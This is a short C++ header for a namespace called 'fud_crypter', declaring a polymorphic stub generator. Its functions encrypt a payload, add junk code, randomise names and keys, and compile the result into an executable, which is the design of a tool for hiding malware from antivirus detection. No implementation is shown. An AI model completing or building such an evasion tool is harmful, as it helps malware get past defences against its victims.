#pragma once
#include <vector>
#include <string>
#include <cstdint>

namespace fud_crypter {

    class PolymorphGenerator {
    public:
        static std::vector<uint8_t> generate_stub(
            const std::vector<uint8_t>& payload,
            const std::vector<uint8_t>& key,
            bool randomize = true
        );

        static std::string generate_junk_code(int lines = 5);
        static std::string random_var_name();
        static std::vector<uint8_t> random_key(size_t size = 32);
        static bool compile_stub(const std::string& source_path, const std::string& output_exe);
        static bool save_stub_source(const std::string& path, const std::vector<uint8_t>& source);
    };

} // namespace fud_crypter
